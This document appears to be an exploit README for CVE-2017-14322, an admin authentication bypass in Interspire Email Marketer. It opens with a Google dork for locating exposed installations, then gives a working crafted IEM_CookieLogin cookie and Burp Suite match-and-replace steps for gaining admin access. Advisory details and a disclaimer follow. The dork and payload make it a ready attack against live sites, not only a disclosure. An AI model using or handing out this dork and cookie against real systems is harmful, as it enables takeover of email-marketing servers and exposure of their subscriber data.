# CVE-2017-14322 Interspire Email Marketer (emailmarketer) Exploit

Google Dork
============
```
intitle:"Control Panel" + emailmarketer
```

Exploit using Burp Suit
=======================

Add a Match and Replace for Request header like below:
```
Match: ^Cookie.*$
Replace: Cookie: IEM_CookieLogin=YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D
```
When you open the site, it won't work for the first time as the Cookie header is not present. Refresh the site 2nd time using Burp proxy with added above rule, you'll see what you have wanted. Make sure to tick on "Intercept Client Requests"

Title:
======
Interspire Email Marketer - Remote Admin Authentication Bypass

Author:
=======
Hakan KÃ¼sne, Infoteam Security (CH)

CVE-ID:
=======
CVE-2017-14322

Risk Information:
=================
CVSS Base Score: 9.8
CVSS Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:O

Timeline:
=========
2017-09-12 Vulnerability discovered
2017-09-12 Discovered vendor already fixed it but never communicated to clients, leaving hundreds vulnerable in the wild
2017-10-17 Public disclosure

Affected Products:
==================
Interspire Email Marketer prior to version 6.1.6

Vendor Homepage:
================
http://www.interspire.com/emailmarketer/

Details:
========
The function in charge of checking whether the user is already logged in 
init.php in Interspire Email Marketer (IEM) prior to 6.1.6 allows 
remote attackers to bypass authentication and obtain administrative 
access by using the IEM_CookieLogin cookie with a specially crafted 
value.
On top of that, if the customer doesn't have an annuel maintenance plan, 
the application says that it's on the last available version and there is no update.

The vulnerabilities were found during an incident response on a compromise 
instance of the application.

Proof of Concept:
=================
Details provided here : 
https://security.infoteam.ch/en/blog/posts/narrative-of-an-incident-response-from-compromise-to-the-publication-of-the-weakness.html 

Fix:
====
Vendor has patched the vulnerability in version 6.1.6, but never communicated to it's customers about it specifically.

Note:
=====
This exploit is for educational purpose only and not responsible for your own actions.
